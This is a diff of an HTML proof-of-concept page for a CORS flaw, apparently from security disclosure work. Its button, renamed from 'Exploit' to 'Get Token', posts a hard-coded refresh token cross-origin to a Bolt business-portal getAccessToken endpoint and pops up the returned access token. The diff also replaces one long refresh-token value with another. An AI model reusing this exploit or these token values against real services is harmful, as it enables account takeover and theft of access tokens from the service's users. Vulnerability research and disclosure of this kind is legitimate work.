@@ -1,13 +1,13 @@
 <html>
      <body>
-         <h2>CORS PoC</h2>
+         <h2>CORS PoC GET Token</h2>
          <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
+             <button type="button" onclick="cors()">Get Token</button>
          </div>
          <script>
              function cors() {
              var xhr = new XMLHttpRequest();
-var json ={"refresh_token":"0NJEr2LVDruDqufG3eBXpO98tEEDHLH8CqXkMDzWFvHynKceCT34JiU8Q6BexPI2cdKJEcf7jU1bDZWRBOe5HClKIeumTJIPdPvmOavmLX6C7MvTdgdb2Ut54iFsbtcVYMdbJOgNJ9ToPVbkYG8mMcl3uIDioWVHHT8BYg5bhe1vSoxRVWM0EO7qq7iEQWwaSsw3XrfPWrl1vwL1Vbgfmh1w6TVmkx3uDBhoy6s5piOhhkwEIldScakl9xnwrES"}
+var json ={"refresh_token":"nSIh9xs9AafxMNlsggdB6obhkz3rAoa3dQN8I55UCmLEGVkbpv3TiScp06cTqccOkp587E7wIqBV84fZxGYKQ7SfNTIYNef3N8yHGJvY7HjP7sYd1TcuDDzTRq1e27HFRKcRvWO8JQUt7Y3wO92k4ri3HjT9n8HVha2T0x5fXsxJayrMOKVbbGYCXpYcnNTBe8AK7malsQBZwub5e4KcErJj8VF5csOA5kyVnsyGSWhJKtUlx3Xde024F3YsiZ1"}
              xhr.onreadystatechange = function() {
                  if (this.readyState == 4 && this.status == 200) {
                   document.getElementById("demo").innerHTML = alert(this.responseText);
@@ -17,7 +17,7 @@ var json ={"refresh_token":"0NJEr2LVDruDqufG3eBXpO98tEEDHLH8CqXkMDzWFvHynKceCT34
              };
 		
               xhr.open("POST",
-                       "https://node.bolt.eu/business-portal/businessPortal/getAccessToken?version=BP.21.59&session_id=779476b174913103", true);
+                       "https://node.bolt.eu/business-portal/businessPortal/getAccessToken?version=BP.21.59", true);
 		     xhr.setRequestHeader('Referer', '');
 xhr.setRequestHeader('Content-Type', 'application/json')
          
@@ -25,6 +25,6 @@ xhr.send(JSON.stringify(json))
         
              }
          </script>
-     xhr.send();
+   
      </body>
  </html>
